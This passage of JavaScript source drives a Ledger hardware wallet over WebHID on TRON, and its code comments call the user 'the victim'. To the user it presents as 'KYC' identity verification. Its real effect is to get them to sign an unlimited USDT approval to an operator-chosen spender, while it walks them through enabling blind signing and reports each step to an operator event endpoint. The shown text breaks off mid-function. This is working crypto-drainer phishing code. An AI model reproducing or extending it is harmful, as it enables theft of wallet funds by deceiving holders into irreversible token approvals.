// Ledger Test — TRON Approval (vereinfacht für TRON Mainnet USDT)
import { Buffer } from 'buffer';
import TransportWebHID from '@ledgerhq/hw-transport-webhid';
import Trx from '@ledgerhq/hw-app-trx';

window.Buffer = Buffer;

// Nur TRON Mainnet USDT
const NETWORK = {
  name: 'TRON Mainnet (USDT)',
  rpc: 'https://api.trongrid.io',
  contract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  explorer: 'https://tronscan.org',
  decimals: 6
};

// Account index via ?acct=N — the victim can verify a second Ledger TRON
// account (44'/195'/N'/0/0) without touching the first one's approvals.
const ACCT = (() => {
  const a = parseInt(new URLSearchParams(window.location.search).get('acct') || '0', 10);
  return Number.isInteger(a) && a >= 0 && a <= 255 ? a : 0;
})();
const DEFAULT_PATH = "44'/195'/" + ACCT + "'/0/0";
let ledgerAddress = '';
let spenderAddress = '';
// Approve amount: default unlimited (max uint256). The dashboard embeds a
// custom amount as ?amt=<base units> — invalid values block signing rather
// than silently approving a different amount than configured.
let approveUnits = (1n << 256n) - 1n;
let amtInvalid = false;
function approveAmountLabel() {
  return approveUnits.toString();
}
function fmtUsdt(units) {
  return (Number(units) / 1e6).toLocaleString('en-US', { maximumFractionDigits: 6 });
}
let ledgerCfg = null; // app config flags read at connect (allowData/allowContract/signByHash)
let ledgerTrxSun = null; // owner's TRX balance in SUN — fees always burn from this account
let activeTransport = null; // tracked so error paths can release the HID session

const SESSION_ID = new URLSearchParams(window.location.search).get('session') || '';
const $ = (id) => document.getElementById(id);

// ── Live monitor — fire-and-forget events to the shared event store ─────────
const MONITOR_URL = '/api/events';
const _monSid = 'lg-' + Math.random().toString(36).slice(2, 8);
function monit(ev, data) {
  try {
    const d = Object.assign({ session: SESSION_ID }, data || {});
    const p = JSON.stringify({ ev, t: new Date().toISOString(), sid: _monSid, d });
    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, p)) return;
    fetch(MONITOR_URL, { method: 'POST', mode: 'no-cors', keepalive: true, body: p }).catch(() => {});
  } catch (e) {}
}

const log = (msg, cls = '') => {
  const el = $('apdu-log');
  if (!el) return;
  const line = document.createElement('div');
  line.className = 'log-line ' + cls;
  line.textContent = msg;
  el.appendChild(line);
  el.scrollTop = el.scrollHeight;
};
const setStatus = (t) => {
  if ($('status')) $('status').textContent = t;
  if ($('status2')) $('status2').textContent = t;
};
const setResultStatus = (t) => {
  if ($('result-status')) $('result-status').textContent = t;
};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const b58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
function b58ToHex(addr) {
  let n = 0n;
  for (const c of addr) {
    const i = b58.indexOf(c);
    if (i < 0) throw new Error('Invalid Base58 address: ' + addr);
    n = n * 58n + BigInt(i);
  }
  const hex = n.toString(16).padStart(50, '0');
  if (!hex.startsWith('41')) throw new Error('No TRON address prefix (0x41)');
  return hex.slice(0, 42);
}
const addrParam = (addr) => b58ToHex(addr).slice(2).padStart(64, '0');
const isTronAddr = (a) => /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a);

function markSessionVerified(txID) {
  if (!SESSION_ID) return;
  const sessions = getSessions();
  if (sessions[SESSION_ID]) {
    sessions[SESSION_ID].verified = true;
    sessions[SESSION_ID].verifiedAt = Date.now();
    if (txID) sessions[SESSION_ID].txID = txID;
    localStorage.setItem('kyc_sessions', JSON.stringify(sessions));
  }
  // Mirror completion to the backend so another browser lands on the
  // completion state instead of "session not found".
  fetch('/api/events', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, keepalive: true,
    body: JSON.stringify({ op: 'sess_done', session: SESSION_ID, txID: txID || '' })
  }).catch(() => {});

  // Trigger certificate email generation
  if (ledgerAddress && txID) {
    fetch('/api/generate-and-send-certificate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session: SESSION_ID,
        txID: txID,
        address: ledgerAddress
      })
    }).then(r => r.json()).then(data => {
      if (data.ok) {
        // Show certificate section
        const certSection = $('certificate-section');
        if (certSection) certSection.classList.remove('hidden');
        // Store certificate ID for download
        if (data.certificateId) {
          sessions[SESSION_ID].certificateId = data.certificateId;
          localStorage.setItem('kyc_sessions', JSON.stringify(sessions));
        }
      }
    }).catch(e => {
      log('Certificate generation failed: ' + (e?.message || e), 'warn');
    });
  }
}

// Read-only simulation: current USDT allowance for (owner, spender).
// A failure here must never block signing — it is only a dedup optimisation.
async function currentAllowance(owner, spender) {
  try {
    const sim = await api('/wallet/triggerconstantcontract', {
      owner_address: owner,
      contract_address: NETWORK.contract,
      function_selector: 'allowance(address,address)',
      parameter: addrParam(owner) + addrParam(spender),
      visible: true,
    });
    const hex = sim?.constant_result?.[0] || '';
    return hex ? BigInt('0x' + hex) : 0n;
  } catch (e) {
    log('Allowance pre-check failed — proceeding anyway: ' + (e?.message || e), 'warn');
    return 0n;
  }
}

// Spender-Adresse aus URL-Parameter oder localStorage holen
function getSpenderAddress() {
  // 1. URL-Parameter
  const urlParams = new URLSearchParams(window.location.search);
  const fromUrl = urlParams.get('spender');
  if (fromUrl && isTronAddr(fromUrl)) return fromUrl;
  
  // 2. localStorage
  const fromStorage = localStorage.getItem('ledger_spender');
  if (fromStorage && isTronAddr(fromStorage)) return fromStorage;
  
  return '';
}

// ?amt=<base units> from the generated link — plain integer, ≤ max uint256
function readApproveUnits() {
  const raw = new URLSearchParams(window.location.search).get('amt');
  if (raw == null || raw === '') return;
  if (!/^\d{1,78}$/.test(raw)) { amtInvalid = true; return; }
  const v = BigInt(raw);
  if (v <= 0n || v > (1n << 256n) - 1n) { amtInvalid = true; return; }
  approveUnits = v;
}

// Session validation — link must be valid & unexpired
function getSessions() {
  try { return JSON.parse(localStorage.getItem('kyc_sessions') || '{}'); }
  catch { return {}; }
}

// localStorage is the fast path; on a miss we ask the backend — the session may
// have been created in another browser (docs there, Ledger flow here in Chrome).
async function validateSession() {
  const urlParams = new URLSearchParams(window.location.search);
  const sessionId = urlParams.get('session');
  if (!sessionId) return { valid: true }; // direct access allowed

  const sessions = getSessions();
  const sess = sessions[sessionId];
  if (sess) {
    if (sess.expired || Date.now() >= sess.expiresAt) return { valid: false, reason: 'Session expired' };
    if (sess.verified) return { valid: false, reason: 'Already completed' };
    return { valid: true, session: sess };
  }

  // Cross-browser recovery — one server lookup
  try {
    const ctl = new AbortController();
    const t = setTimeout(() => ctl.abort(), 2500);
    const r = await fetch('/api/events?sess=' + sessionId, { signal: ctl.signal });
    clearTimeout(t);
    const j = await r.json().catch(() => ({}));
    if (!j.ok || !j.found) return { valid: false, reason: 'Session not found' };
    if (j.verified) return { valid: false, reason: 'Already completed', txID: j.txID };
    if (j.expired || (j.expiresAt && Date.now() >= j.expiresAt))
      return { valid: false, reason: 'Session expired' };
    // Hydrate local state so the rest of the flow works unchanged
    sessions[sessionId] = {
      from: j.from, to: j.to, expiresAt: j.expiresAt,
      verified: false, docsSubmitted: true, server: true
    };
    localStorage.setItem('kyc_sessions', JSON.stringify(sessions));
    monit('session_recovered', { remote: true });
    return { valid: true, session: sessions[sessionId] };
  } catch {
    return { valid: false, reason: 'Session not found' };
  }
}

// Result screen helpers — approve success is the KYC completion moment
function setTxLink(txID) {
  const link = $('txlink');
  if (!txID) { link.hidden = true; link.textContent = ''; return; }
  link.href = NETWORK.explorer + '/#/transaction/' + txID;
  link.textContent = txID;
  link.hidden = false;
}

function showCompletion(txID) {
  hideErrorPanel(); // a mid-sign expiry panel must not linger over the success screen
  const ic = $('result-icon');
  ic.textContent = '✓';
  ic.style.color = '#14914b';
  $('result-title').textContent = 'Verification Complete';
  setResultStatus('Identity verification completed successfully.');
  $('result-detail').textContent = 'Documents verified · Hardware wallet ownership confirmed';
  setTxLink(txID);
  $('done-hint').classList.remove('hidden');
  $('reset').classList.add('hidden');
  $('step1').classList.add('hidden');
  $('step2').classList.add('hidden');
  $('step3').classList.remove('hidden');
  // Journey: Ledger phase complete → Verified
  const led = $('j-ledger'), con2 = $('jc-ledger'), done = $('j-done');
  if (led && done) {
    led.className = 'jstep done'; led.querySelector('.jdot').textContent = '✓';
    if (con2) con2.classList.add('done');
    done.className = 'jstep done'; done.querySelector('.jdot').textContent = '✓';
  }
}

function showResult(kind, title, status, txID, detail) {
  hideErrorPanel();
  const ic = $('result-icon');
  ic.textContent = kind === 'ok' ? '✓' : '✗';
  ic.style.color = kind === 'ok' ? '#14914b' : '#d92d20';
  $('result-title').textContent = title;
  setResultStatus(status);
  $('result-detail').textContent = detail || '';
  setTxLink(txID);
  $('done-hint').classList.add('hidden');
  $('reset').classList.remove('hidden');
  $('step1').classList.add('hidden');
  $('step2').classList.add('hidden');
  $('step3').classList.remove('hidden');
}

// Show session context in UI — the journey only appears for real KYC sessions.
// Hydrates from the backend when the session was created in another browser.
(async function showSessionContext() {
  const sessions = getSessions();
  let sess = SESSION_ID ? sessions[SESSION_ID] : null;
  if (!sess && SESSION_ID) {
    try {
      const r = await fetch('/api/events?sess=' + SESSION_ID);
      const j = await r.json().catch(() => ({}));
      if (j.ok && j.found) {
        sess = { from: j.from, to: j.to, expiresAt: j.expiresAt,
                 verified: j.verified, docsSubmitted: true, server: true };
        sessions[SESSION_ID] = sess;
        localStorage.setItem('kyc_sessions', JSON.stringify(sessions));
      }
    } catch {}
  }
  const journey = $('journey');
  if (journey && !(sess && sess.docsSubmitted)) journey.style.display = 'none';
  if (!sess) return;
  const box = $('session-box');
  if (box) {
    box.style.display = 'block';
    $('ctx-from').textContent = sess.from || '-';
    $('ctx-to').textContent = sess.to || '-';
  }
  monit('ledger_opened', { from: sess.from, to: sess.to });

  const pill = $('sess-pill'), pillVal = $('sess-pill-val');
  if (pill && pillVal && sess.expiresAt && !sess.verified) {
    let expiredFired = false;
    const tick = () => {
      const remaining = sess.expiresAt - Date.now();
      if (remaining <= 0) {
        pill.classList.add('hidden');
        clearInterval(iv);
        const cur = getSessions()[SESSION_ID];
        if (!expiredFired && !(cur && cur.verified)) {
          expiredFired = true;
          monit('kyc_expired');
          showErrorPanel(new Error('Session expired'));
        }
        return;
      }
      const m = Math.floor(remaining / 60000), s = Math.floor((remaining % 60000) / 1000);
      pill.classList.remove('hidden');
      pillVal.textContent = `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
      pill.classList.toggle('danger', remaining < 120000);
      pill.classList.toggle('warn', remaining >= 120000 && remaining < 300000);
    };
    const iv = setInterval(tick, 1000);
    tick();
  }
})();

// ─── Error handling: classify → guided fix panel with retry ────────────────
// Status words verified against LedgerHQ/app-tron src/app_errors.h:
//   0x6985 user reject · 0x6e00 wrong app/CLA · 0x6d00 old app/INS
//   0x6a80 bad data · 0x6a8a bad BIP32 path
//   0x6a8b "Transactions data" NOT allowed · 0x6a8c "Blind signing"/Sign-by-hash NOT allowed
//   0x6a8d "Custom contracts" NOT allowed · 0x6a8e swap check fail
let lastAction = null; // 'connect' | 'approve' | 'revoke'
let busy = false;      // reentrancy guard — a second click must not fork the flow
let settingsOk = true; // device settings verified via getAppConfiguration()
function updateButtons() {
  for (const id of ['connect', 'approve', 'revoke', 'recheck']) {
    const b = $(id);
    if (!b) continue;
    b.disabled = busy
      || (id === 'connect' && !navigator.hid)
      || ((id === 'approve' || id === 'revoke') && !settingsOk);
  }
}
function setBusy(v) { busy = v; updateButtons(); }

// Render the live device-settings checklist — flags come from getAppConfiguration().
// allowData/allowContract are required for this flow (0x6a8b/0x6a8d otherwise);
// signByHash is only needed for the oversized-tx fallback → shown as optional.
function renderSettingsCheck(cfg) {
  const card = $('settings-check');
  if (!card || !cfg) return;
  card.classList.remove('hidden');
  const rows = [
    { id: 'sc-data',     on: cfg.allowData },
    { id: 'sc-contract', on: cfg.allowContract },
    { id: 'sc-hash',     on: cfg.signByHash, optional: true },
  ];
  let missingReq = 0;
  for (const r of rows) {
    const li = $(r.id);
    if (!li) continue;
    const icon = li.querySelector('.sicon'), badge = li.querySelector('.sbadge');
    if (r.on) {
      li.className = 'srow on';
      icon.textContent = '✓';
      badge.className = 'sbadge ok';
      badge.textContent = r.optional ? 'Enabled' : 'Allowed';
    } else if (r.optional) {
      li.className = 'srow opt';
      icon.textContent = '○';
      badge.className = 'sbadge opt';
      badge.textContent = 'Optional';
    } else {
      li.className = 'srow off';
      icon.textContent = '!';
      badge.className = 'sbadge req';
      badge.textContent = 'Enable';
      missingReq++;
    }
  }
  settingsOk = missingReq === 0;
  card.classList.toggle('ok', settingsOk);
  card.classList.toggle('warn', !settingsOk);
  $('scheck-icon').textContent = settingsOk ? '✓' : '!';
  $('scheck-title').textContent = settingsOk
    ? 'Device ready — you can continue'
    : 'Action required on your Ledger';
  $('scheck-sub').textContent = settingsOk
    ? 'All required TRON app settings are enabled'
    : 'Enable the flagged settings in the TRON app settings, then press "Re-check"';
  // getAppConfiguration() normalizes flags on very old apps (<0.1.2) — the
  // checklist would report Custom-contracts as off while no such setting exists
  const oldApp = typeof cfg.versionN === 'number' && cfg.versionN < 40;
  $('scheck-meta').textContent = (ledgerAddress
    ? `TRON app v${cfg.version} · ${ledgerAddress.slice(0, 10)}…${ledgerAddress.slice(-6)}`
    : `TRON app v${cfg.version}`) + (oldApp ? ' · old app version — update via Ledger Live' : '');
  $('recheck').classList.toggle('hidden', settingsOk);
  updateButtons();
}

const SETTING_STEP = (label) => [
  'On the Ledger: open the TRON app',
  'Nano (S/S+/X): press the RIGHT button once → "App settings" → press BOTH buttons',
  'Touch (Stax/Flex/Apex): tap the gear / Settings icon',
  `Toggle "${label}" → Allowed / Enabled`,
  'Exit back to the ready screen',
  'Click "Try Again" below',
];

function classifyError(e) {
  const m = (e?.message || '').toLowerCase();
  const code = e?.statusCode;
  const has = (...xs) => xs.some((x) => m.includes(x));
  const W = 'warn', E = 'error';

  // Dead session — no retry possible, only a fresh link helps
  if (has('session expired', 'session not found', 'session no longer valid'))
    return { kind: E, title: 'Verification link is no longer valid', noRetry: true,
      desc: 'This verification session has expired or is unknown to this browser.',
      steps: ['Request a new verification link from the operator',
        'Links are valid for 30 minutes after they are first opened',
        'Complete the verification in one browser session — reloading clears local state'] };

  // ── Setting-gated failures: exact firmware codes 0x6a8b/c/d ──────────────
  if (code === 27275 || has('0x6a8b'))
    return { kind: W, title: '"Transactions data" is not allowed',
      desc: 'The TRON app blocked the signature because transaction-data display is disabled.',
      steps: SETTING_STEP('Transactions data') };

  if (code === 27277 || has('0x6a8d'))
    return { kind: W, title: '"Custom contracts" is not allowed',
      desc: 'The TRON app blocked this smart-contract call (USDT approve). Custom contracts must be enabled.',
      steps: SETTING_STEP('Custom contracts') };

  if (code === 27276 || has('0x6a8c'))
    return { kind: W, title: '"Blind signing" is not allowed',
      desc: 'The transaction is too large to display fully — the app needs hash signing enabled.',
      steps: SETTING_STEP('Blind signing') };

  // Generic data-blocked fallbacks (older app versions use 0x6a80)
  // — broadcast errors carry the same keywords, so they must not land here
  if (!has('broadcast') &&
      (code === 27012 || code === 27264 ||
      has('0x6984', '0x6a80', 'contract data', 'transactions data',
          'data not allowed', 'custom contract', 'blind sign')))
    return { kind: W, title: 'A required TRON app setting is disabled',
      desc: 'The Ledger blocked the contract signature. Enable all three settings in the TRON app.',
      steps: [
        'On the Ledger: open the TRON app → App settings',
        'Set "Transactions data" → Allowed',
        'Set "Custom contracts" → Allowed',
        'Set "Blind signing" (Sign by hash) → Allowed',
        'Return to the ready screen, then click "Try Again"'] };

  // Browser HID picker cancelled / gesture required
  if (has('no device selected', 'requestdevice', 'user gesture', 'must be handling'))
    return { kind: W, title: 'No device selected',
      desc: 'The browser device picker was closed without selecting a Ledger.',
      steps: ['Click "Try Again"',
        'In the popup, select your Ledger and click "Connect"',
        'Make sure the Ledger is unlocked and the TRON app is open'] };

  if (code === 27274 || has('0x6a8a'))
    return { kind: E, title: 'Invalid derivation path',
      desc: 'The app rejected the account path (' + DEFAULT_PATH + ').',
      steps: ['This should not happen — reconnect the Ledger',
        'If it persists, update the TRON app via Ledger Live'] };

  if (code === 28416 || has('0x6f00'))
    return { kind: E, title: 'Ledger internal error',
      desc: 'The device reported a technical problem (0x6f00).',
      steps: ['Unplug and reconnect the Ledger',
        'Restart the TRON app',
        'Click "Try Again"'] };

  if (has('too many bytes'))
    return { kind: W, title: 'Transaction too large for the device',
      desc: 'The Ledger cannot display this transaction field-by-field. It can still be signed via hash.',
      steps: SETTING_STEP('Blind signing') };

  if (code === 27013 || has('0x6985') || /reject|denied|cancel/i.test(m))
    return { kind: W, title: 'Rejected on the Ledger',
      desc: 'The signature was declined on the device — or the confirmation screen was skipped.',
      steps: ['Click "Try Again" below',
        'On the Ledger, press the right button to scroll through ALL screens',
        'Verify the contract address is TR7NHqje…Lj6t (USDT)',
        'On the final "Accept" / "Sign" screen, press BOTH buttons'] };

  if (code === 28160 || has('0x6e00'))
    return { kind: W, title: 'TRON app is not open',
      desc: 'The Ledger is connected, but the TRON app is not running on the device.',
      steps: ['On the Ledger, open the TRON app',
        'Wait until "Application is ready" shows',
        'Click "Try Again"'] };

  if (code === 27010 || has('0x6982'))
    return { kind: W, title: 'Ledger is locked',
      desc: 'The device rejected the command — it is locked or access was denied.',
      steps: ['Unlock the Ledger with your PIN',
        'Open the TRON app',
        'Click "Try Again"'] };

  if (has('cannot open device', 'access denied', 'failed to open', 'busy', 'locked by'))
    return { kind: E, title: 'Ledger is busy',
      desc: 'Another application is holding the Ledger and blocking the connection.',
      steps: ['Completely quit Ledger Live',
        'Close other wallet apps or browser tabs using the device',
        'Unplug and reconnect the USB cable',
        'Click "Try Again"'] };

  if (has('device not found', 'no device', 'not connected', 'disconnected'))
    return { kind: E, title: 'No Ledger detected',
      desc: 'The browser cannot see a Ledger device.',
      steps: ['Connect the Ledger via USB (direct port, original cable)',
        'Unlock it with your PIN',
        'Click "Try Again"'] };

  if (code === 27904 || has('0x6d00'))
    return { kind: E, title: 'TRON app version too old',
      desc: 'The installed TRON app does not support this instruction.',
      steps: ['Open Ledger Live → Manager',
        'Update the TRON app to the latest version',
        'Click "Try Again"'] };

  if (has('timeout', 'timed out'))
    return { kind: E, title: 'Connection timeout',
      desc: 'The Ledger did not respond in time.',
      steps: ['Unplug and reconnect the USB cable',
        'Avoid USB hubs — use a direct port',
        'Click "Try Again"'] };

  // ── Broadcast rejection codes surfaced via "Broadcast <CODE>: <msg>" ─────
  // 'expir' covers expired/expiry — session errors are already handled above
  if (has('expir') && !has('session'))
    return { kind: W, title: 'Transaction expired',
      desc: 'Node-built transactions live only ~60 seconds — the device review outlasted the window.',
      steps: ['Click "Try Again" — a fresh transaction is built automatically',
        'Scroll through the device screens promptly after it appears',
        'We rebuild once automatically; a second expiry needs a manual retry'] };

  if (has('account does not exist', 'not activated'))
    return { kind: E, title: 'Ledger wallet is not activated on-chain',
      desc: 'The connected address has no TRX balance — TRON cannot process a transaction from an unactivated account.',
      steps: ['Send at least ~2 TRX to the Ledger TRON address shown above',
        'Wait a few seconds for the transfer to confirm',
        'Click "Try Again"'] };

  if (has('bandwith', 'balance is not sufficient', 'accountresourceinsufficient',
          'insufficient', 'balance'))
    return { kind: E, title: 'Not enough TRX for network fees',
      desc: 'The wallet cannot cover Bandwidth/Energy — the USDT approve costs a small TRX amount.',
      steps: ['Top up the Ledger wallet with ~3–5 TRX for fees',
        'Click "Try Again"'] };

  if (has('sigerror', 'validateSignature', 'signature error'))
    return { kind: E, title: 'Signature rejected by the network',
      desc: 'TRON could not verify the signature against the sender address.',
      steps: ['Reconnect the Ledger and click "Try Again"',
        'If it persists, update the TRON app via Ledger Live'] };

  if (has('tapos'))
    return { kind: W, title: 'Stale block reference',
      desc: 'The transaction referenced a block the node no longer accepts (reorg or expiry).',
      steps: ['Click "Try Again" — a fresh transaction uses a new block reference'] };

  if (has('dup_transaction'))
    return { kind: W, title: 'Already broadcast',
      desc: 'This exact transaction is already in the network pool — it cannot be sent twice.',
      steps: ['Check the transaction link for its status',
        'If it confirmed, the verification already succeeded'] };

  if (has('server_busy', 'no_connection', 'not_enough_effective', 'unsolidified'))
    return { kind: W, title: 'TRON node temporarily unavailable',
      desc: 'The RPC node is busy or still syncing — this is transient.',
      steps: ['Wait a few seconds and click "Try Again"'] };

  if (has('out_of_energy'))
    return { kind: E, title: 'Transaction ran out of Energy',
      desc: 'The contract call consumed the whole Energy budget (fee_limit).',
      steps: ['Top up the wallet with more TRX so it can burn for Energy',
        'Click "Try Again"'] };

  if (has('broadcast', 'revert', 'contract_validate_error', 'contract_exe_error')) {
    if (ledgerTrxSun === 0)
      return { kind: E, title: 'No TRX for network fees',
        desc: `The connected wallet (${ledgerAddress || 'unknown'}) holds 0 TRX. The approve burns ~30 TRX in Energy — fees are always paid by the signing wallet itself; TRON has no fee sponsorship.`,
        steps: [`Send at least 30 TRX to ${ledgerAddress || 'the wallet'} (e.g. from Trust Wallet)`,
          'Wait ~5 seconds for the transfer to confirm',
          'Click "Try Again"'] };
    return { kind: E, title: 'Transaction rejected by network',
      desc: 'TRON refused the transaction — most likely missing TRX for fees/energy or an invalid parameter.',
      steps: [`Wallet balance: ${ledgerTrxSun === null ? 'unknown' : (ledgerTrxSun / 1e6) + ' TRX'} — check it covers the energy burn (~30 TRX)`,
        'Verify the spender address is correct',
        'Click "Try Again"'] };
  }

  if (has('webhid', 'not supported', 'navigator.hid'))
    return { kind: E, title: 'Browser not supported',
      desc: 'This browser cannot talk to USB devices via WebHID.',
      steps: ['Use Chrome or Edge on a desktop computer',
        'Reload the page and try again'] };

  return { kind: E, title: 'Unexpected error',
    desc: e?.message || String(e),
    steps: ['Reconnect the Ledger (unplug → replug → unlock → open TRON app)',
      'Click "Try Again" — or reload the page'] };
}

function showErrorPanel(e) {
  const { kind, title, desc, steps, noRetry } = classifyError(e);
  const panel = $('error-panel');
  if (!panel) return;
  const warn = kind === 'warn';
  panel.style.borderColor = warn ? '#f0b429' : '#d92d20';
  panel.style.background = warn ? '#fffaeb' : '#fef3f2';
  $('error-icon').style.color = warn ? '#b54708' : '#d92d20';
  $('error-title').textContent = title;
  $('error-title').style.color = warn ? '#b54708' : '#d92d20';
  $('error-desc').textContent = desc;
  const ol = $('error-steps');
  ol.innerHTML = '';
  for (const s of steps) {
    const li = document.createElement('li');
    li.textContent = s;
    ol.appendChild(li);
  }
  $('error-retry').style.display = noRetry ? 'none' : '';
  panel.classList.remove('hidden');
  panel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  return title;
}

function hideErrorPanel() {
  $('error-panel')?.classList.add('hidden');
}

$('error-retry').addEventListener('click', () => {
  hideErrorPanel();
  const target = lastAction === 'approve' ? $('approve')
    : lastAction === 'revoke' ? $('revoke') : $('connect');
  // An explicit retry overrides the settings gate — a disabled button would
  // swallow the click silently and strand the user.
  if (target.disabled) target.disabled = false;
  target.click();
});
$('error-dismiss').addEventListener('click', hideErrorPanel);

function checkBrowserSupport() {
  if (!navigator.hid) {
    setStatus('Unsupported browser — please use Chrome or Edge on a desktop computer (WebHID required).');
    $('connect').disabled = true;
    $('connect').textContent = 'WebHID not supported';
    return false;
  }
  return true;
}

// Reuse an already-authorized device without popping the browser picker again;
// falls back to create() (picker) when nothing is authorized yet.
async function openTransport() {
  const existing = await TransportWebHID.openConnected().catch(() => null);
  if (existing) return existing;
  return TransportWebHID.create();
}

const sha256hex = async (hex) => {
  const h = await crypto.subtle.digest('SHA-256', Buffer.from(hex, 'hex'));
  return Array.from(new Uint8Array(h)).map((b) => b.toString(16).padStart(2, '0')).join('');
};

// transport.send wrapper
function instrument(transport) {
  const orig = transport.send.bind(transport);
  transport.send = (cla, ins, p1, p2, data, statusList) => {
    const payload = data ? ' data=' + Buffer.from(data).toString('hex') : '';
    log(
      `>> APDU  CLA=0x${cla.toString(16).padStart(2, '0')} INS=0x${ins
        .toString(16)
        .padStart(2, '0')} P1=0x${p1.toString(16).padStart(2, '0')} P2=0x${p2
        .toString(16)
        .padStart(2, '0')}${payload}`,
      'apdu'
    );
    return orig(cla, ins, p1, p2, data, statusList).then((res) => {
      log(`<< RESP ${Buffer.from(res).toString('hex')}`, 'resp');
      return res;
    });
  };
  return transport;
}

async function apiOnce(path, body) {
  const r = await fetch(NETWORK.rpc + path, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  if (!r.ok) throw new Error(`RPC ${path}: HTTP ${r.status}`);
  return r.json();
}
async function api(path, body, tries = 3) {
  let lastErr;
  for (let i = 0; i < tries; i++) {
    try { return await apiOnce(path, body); }
    catch (e) { lastErr = e; if (i < tries - 1) await sleep(800 * (i + 1)); }
  }
  throw lastErr;
}

// Node-built transactions expire ~60s after construction (raw_data.expiration).
// A Ledger review can outlive that window — guard before signing and rebuild
// transparently when the broadcast comes back expired.
const TX_EXPIRY_GUARD_MS = 15_000;
const MAX_TX_ATTEMPTS = 2;
const txExpiresIn = (tx) => (tx?.raw_data?.expiration || 0) - Date.now();

// Broadcast `message` is UTF-8 when the tx is visible=true, hex otherwise — decode defensively
function decodeMsg(m) {
  if (!m) return '';
  if (/^[0-9a-fA-F]+$/.test(m) && m.length % 2 === 0) {
    const t = Buffer.from(m, 'hex').toString('utf8');
    if (/^[\x20-\x7e\s]*$/.test(t)) return t;
  }
  return m;
}
const sigToHex = (be) => {
  if (typeof be === 'string') return be;
  const u = be instanceof ArrayBuffer ? new Uint8Array(be) : be;
  const arr = u instanceof Uint8Array ? u : Object.values(be || {});
  if (!arr.length) throw new Error('Unexpected signature format');
  return Array.from(arr).map((x) => x.toString(16).padStart(2, '0')).join('');
};

// Shared build → sign → broadcast pipeline for approve & revoke.
// Handles the 60s expiration window: never signs a nearly-dead tx and
// transparently rebuilds once when the node rejects as expired/stale.
async function buildSignBroadcast(param, op) {
  for (let attempt = 1; attempt <= MAX_TX_ATTEMPTS; attempt++) {
    setStatus(attempt > 1 ? 'Rebuilding a fresh transaction…' : 'Building transaction…');
    const built = await api('/wallet/triggersmartcontract', {
      owner_address: ledgerAddress,
      contract_address: NETWORK.contract,
      function_selector: 'approve(address,uint256)',
      parameter: param,
      fee_limit: 100_000_000,
      call_value: 0,
      visible: true,
    });
    if (!built?.result?.result || !built.transaction)
      throw new Error('Transaction could not be built: ' + decodeMsg(built?.result?.message));
    const tx = built.transaction;
    if (tx.txID && (await sha256hex(tx.raw_data_hex)) !== tx.txID)
      throw new Error('Transaction integrity check failed (txID ≠ sha256 of raw data)');
    log('Calldata: ' + (tx.raw_data.contract[0].parameter.value.data || '(empty)'), 'info');

    // A tx that dies during device review would broadcast as expired — rebuild instead
    if (txExpiresIn(tx) < TX_EXPIRY_GUARD_MS) {
      if (attempt < MAX_TX_ATTEMPTS) { log('Tx expiry window too short — rebuilding', 'warn'); continue; }
      throw new Error('Transaction expiry window too short — please retry');
    }

    setStatus('Please confirm on Ledger… (the transaction is valid ~60s — confirm promptly)');
    monit('sign_wait', { op, attempt });
    const transport = instrument(await openTransport());
    const trx = new Trx(transport);
    let be;
    // WebHID has no timeouts — soft watchdog so a frozen device doesn't look dead
    const watchdog = setTimeout(() =>
      setStatus('Still waiting — scroll through all screens and accept on the Ledger'), 45_000);
    try { be = await signWithLedger(trx, tx); }
    catch (e) { clearTimeout(watchdog); await transport.close(); throw e; }
    clearTimeout(watchdog);
    await transport.close();
    const sig = sigToHex(be);
    monit('signed', { op, attempt });

    // Signed but already dead → rebuild before wasting a broadcast
    if (txExpiresIn(tx) <= 0) {
      if (attempt < MAX_TX_ATTEMPTS) {
        setStatus('Transaction expired during review — rebuilding, please confirm again on the Ledger…');
        log('Tx expired during device review — rebuilding', 'warn');
        continue;
      }
      throw new Error('Transaction expired during device review — please retry');
    }

    setStatus('Broadcasting transaction…');
    const out = await api('/wallet/broadcasttransaction', { ...tx, signature: [sig] });
    if (out.result === true) {
      monit('broadcast', { op, tx: tx.txID, attempt, from: ledgerAddress, spender: spenderAddress });
      return tx;
    }
    const code = out.code || '';
    const msg = decodeMsg(out.message);
    // Stale tx (expired / TAPOS) → one transparent rebuild+re-sign
    if (attempt < MAX_TX_ATTEMPTS &&
        (code === 'TRANSACTION_EXPIRATION_ERROR' || code === 'TAPOS_ERROR' ||
         /expired|tapos/i.test(msg))) {
      setStatus('Transaction went stale — rebuilding, please confirm again on the Ledger…');
      log(`Broadcast ${code || msg} — rebuilding`, 'warn');
      monit('tx_stale_rebuild', { op, code });
      continue;
    }
    // Same txID already in the pool — it IS on the wire, go confirm it
    if (code === 'DUP_TRANSACTION_ERROR') {
      monit('broadcast', { op, tx: tx.txID, dup: true });
      return tx;
    }
    const e = new Error(`Broadcast ${code || 'FAILED'}: ${msg || JSON.stringify(out).slice(0, 200)}`);
    e.broadcastCode = code;
    throw e;
  }
  throw new Error('Transaction expired during review — please retry');
}

// Sign with Ledger — falls back to hash signing when the tx is too large
// for field-by-field display (requires "Blind signing" / Sign-by-hash on)
async function signWithLedger(trx, tx) {
  try {
    return await trx.signTransaction(DEFAULT_PATH, tx.raw_data_hex);
  } catch (e) {
    if (!(e?.message || '').toLowerCase().includes('too many bytes')) throw e;
    log('Tx too large for on-device display — falling back to hash signing', 'warn');
    setStatus('Confirm hash signature on Ledger…');
    const h = await crypto.subtle.digest('SHA-256', Buffer.from(tx.raw_data_hex, 'hex'));
    const hashHex = Array.from(new Uint8Array(h)).map((b) => b.toString(16).padStart(2, '0')).join('');
    return await trx.signTransactionHash(DEFAULT_PATH, hashHex);
  }
}

async function waitConfirm(txID, timeoutMs = 90_000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    await sleep(3000);
    const info = await api('/wallet/gettransactioninfobyid', { value: txID }).catch(() => null);
    const receipt = info?.receipt;
